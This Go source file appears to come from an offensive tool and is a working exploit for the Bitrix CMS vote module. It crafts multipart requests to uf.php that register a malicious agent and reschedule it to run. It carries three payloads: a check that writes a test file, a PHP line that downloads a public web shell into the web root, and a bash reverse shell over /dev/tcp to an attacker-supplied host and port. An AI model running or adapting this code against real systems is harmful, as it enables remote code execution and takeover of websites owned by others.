package va

import (
	"bytes"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"quick-tricks/modules/tokens"
	"quick-tricks/utils/colors"
	"strings"
	"time"
)

const endpoint = "/bitrix/tools/vote/uf.php?attachId[ENTITY_TYPE]=CFileUploader&attachId[ENTITY_ID][events][onFileIsStarted][]=CAllAgent&attachId[ENTITY_ID][events][onFileIsStarted][]=Update&attachId[MODULE_ID]=vote&action=vote"

var counter int

func Exploit(target, lhost, lport, agentId string, webshell bool) (string, string, error) {
	if agentId == "4" {
		agentId = "r"
	}
	if agentId == "7" {
		agentId = "u"
	}
	if agentId == "2" {
		agentId = "bitrix50"
	}

	compositeData, cookie, err := tokens.Get(target)
	if err != nil {
		return "", "", err
	}
	if compositeData == nil {
		err = fmt.Errorf("Unable to access composite data.")
		return "", "", err
	}

	var success bool
	var resp *http.Response
	var client http.Client
	var bodyReq string

	serverTime := compositeData.ServerTime
	serverTzOffset := compositeData.ServerTzOffset
	bitrixSessid := compositeData.BitrixSessid

	url := target + endpoint
	// Generate random name for uploading file.
	randName := randStringRunes(12)
	uploadedFile := target + "/" + randName + ".txt"
	// Loop for sending two requests.
	for r := 0; r <= 1; r++ {
		if r == 0 {
			if webshell == true {
				// Request Body to add agent that will download the web reverse shell.
				uploadedFile = target + "/" + randName + ".php"
				bodyReq = fmt.Sprintf(`-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_files[%s][NAME]"

file_put_contents($_SERVER['DOCUMENT_ROOT']."/%s.php", fopen("https://raw.githubusercontent.com/artyuum/simple-php-web-shell/master/index.php", "r"));
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_files[%s][NAME]"; filename="image.jpg"
Content-Type: image/jpeg

123
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[packageIndex]"

pIndex101
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[mode]"

upload
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="sessid"

%s
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[filesCount]"

1
-----------------------------xxxxxxxxxxxx--
			`, agentId, randName, agentId, bitrixSessid)
			} else {
				// Request Body to add agent that will create dummy file to check if target is vulnerable.
				// DO NOT ADD TABS!!!
				bodyReq = fmt.Sprintf(`-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_files[%s][NAME]"

file_put_contents($_SERVER['DOCUMENT_ROOT']."/%s.txt", "%s\n");
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_files[%s][NAME]"; filename="image.jpg"
Content-Type: image/jpeg

123
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[packageIndex]"

pIndex101
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[mode]"

upload
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="sessid"

%s
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[filesCount]"

1
-----------------------------xxxxxxxxxxxx--
			`, agentId, randName, randName, agentId, bitrixSessid)
			}
		}

		if r == 1 {
			gmtTimeLoc := time.FixedZone("GMT", 0)
			dateUnix := serverTime + serverTzOffset + 20
			date := time.Unix(int64(dateUnix), 0)
			// DO NOT ADD TABS!!!
			// Body for the second request to change agent time.
			bodyReq = fmt.Sprintf(`-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_files[%s][NEXT_EXEC]"

%s
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_files[%s][NAME]"; filename="image.jpg"
Content-Type: image/jpeg

123
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[packageIndex]"

pIndex101
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[mode]"

upload
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="sessid"

%s
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[filesCount]"

1
-----------------------------xxxxxxxxxxxx--
			`, agentId, date.In(gmtTimeLoc).Format("01.02.2006 15:04:05"), agentId, bitrixSessid)
		}
		req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(bodyReq)))
		req.Header.Set("Content-Type", "multipart/form-data; boundary=---------------------------xxxxxxxxxxxx")
		req.AddCookie(cookie)

		resp, err = client.Do(req)
		if err != nil {
			return "", "", err
		}
		if resp.StatusCode == 200 {
			body, _ := io.ReadAll(resp.Body)
			if len(body) != 0 {
				if strings.Contains(string(body), "Connector class should be instance of Bitrix\\\\Vote\\\\Attachment\\\\Connector") {
					colors.BAD.Println("Vote agent module is not vulnerable.")
				}
			}
		}
	}

	fmt.Println("Vote agent might be vulnerable! Waiting 30 sec for agent activation...")
	time.Sleep(30 * time.Second)

	success, err = checkUploadedFile(uploadedFile, randName, webshell)
	if success == true && webshell == true {
		fmt.Sprintf("The target's vote module is vulnerable! Web shell is uploaded, check %s", uploadedFile)
		return "", "", nil
	}
	if success == true && webshell == false {
		colors.OK.Println("The target's vote module is vulnerable! Preparing reverse shell connection.")
		time.Sleep(10 * time.Second)

		err := reverseShellPayload(target, lhost, lport, agentId)
		time.Sleep(10 * time.Second)
		if err != nil {
			fmt.Sprintf("Unable to establish reverse shell connection: %s", err.Error())
		}
	} else if counter <= 3 && webshell == false && !success {
		colors.BAD.Printf("Failed, trying one more time... [%d/3]", counter)
		time.Sleep(3 * time.Second)

		success, err = checkUploadedFile(uploadedFile, randName, webshell)
		if success == true && webshell == false {
			colors.OK.Println("The target's vote module is vulnerable! Preparing reverse shell connection.")
			err := reverseShellPayload(target, lhost, lport, agentId)
			if err != nil {
				fmt.Sprintf("Unable to establish reverse shell connection: %s", err.Error())
			}
		}
	}
	return uploadedFile, randName, nil
}
func checkUploadedFile(uploadedFile string, randName string, webshell bool) (bool, error) {
	var bodyReq string
	var client http.Client
	var resp *http.Response

	req, err := http.NewRequest("GET", uploadedFile, bytes.NewBuffer([]byte(bodyReq)))
	resp, err = client.Do(req)
	if err != nil {
		return false, err
	}

	counter++
	if resp.StatusCode == 200 {
		body, _ := io.ReadAll(resp.Body)
		if webshell == true {
			if strings.Contains(string(body), "Web Shell") {
				return true, nil
			}
		} else {
			if strings.Contains(string(body), randName) {
				return true, nil
			}
		}
	} else if resp.StatusCode == 404 && counter <= 2 {
		return false, nil
	}

	return false, nil
}

func randStringRunes(n int) string {
	var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	rand.Seed(time.Now().UnixNano())
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func reverseShellPayload(target string, localHost string, localPort string, agentId string) error {
	compositeData, cookie, err := tokens.Get(target)
	if err != nil {
		return err
	}
	if compositeData == nil {
		err = fmt.Errorf("Unable to access composite data.")
		return err
	}

	var client http.Client
	var bodyReq string
	serverTime := compositeData.ServerTime
	serverTzOffset := compositeData.ServerTzOffset
	bitrixSessid := compositeData.BitrixSessid
	url := target + endpoint
	for r := 0; r <= 1; r++ {
		// DO NOT ADD TABS!!!
		if r == 0 {
			bodyReq = fmt.Sprintf(`-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_files[%s][NAME]"

system('/bin/bash -c "bash -i >& /dev/tcp/%s/%s 0>&1"');
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_files[%s][NAME]"; filename="image.jpg"
Content-Type: image/jpeg

123
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[packageIndex]"

pIndex101
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[mode]"

upload
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="sessid"

%s
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[filesCount]"

1
-----------------------------xxxxxxxxxxxx--
			`, agentId, localHost, localPort, agentId, bitrixSessid)
		}
		if r == 1 {
			gmtTimeLoc := time.FixedZone("GMT", 0)
			dateUnix := serverTime + serverTzOffset + 20
			date := time.Unix(int64(dateUnix), 0)
			// DO NOT ADD TABS!!!
			bodyReq = fmt.Sprintf(`-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_files[%s][NEXT_EXEC]"

%s
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_files[%s][NAME]"; filename="image.jpg"
Content-Type: image/jpeg

123
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[packageIndex]"

pIndex101
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[mode]"

upload
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="sessid"

%s
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[filesCount]"

1
-----------------------------xxxxxxxxxxxx--
			`, agentId, date.In(gmtTimeLoc).Format("01.02.2006 15:04:05"), agentId, bitrixSessid)
		}
		req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(bodyReq)))
		req.Header.Set("Content-Type", "multipart/form-data; boundary=---------------------------xxxxxxxxxxxx")
		req.AddCookie(cookie)

		resp, err := client.Do(req)
		if err != nil {
			return err
		}
		if resp.StatusCode != 200 {
			return nil
		}
	}

	return nil
}
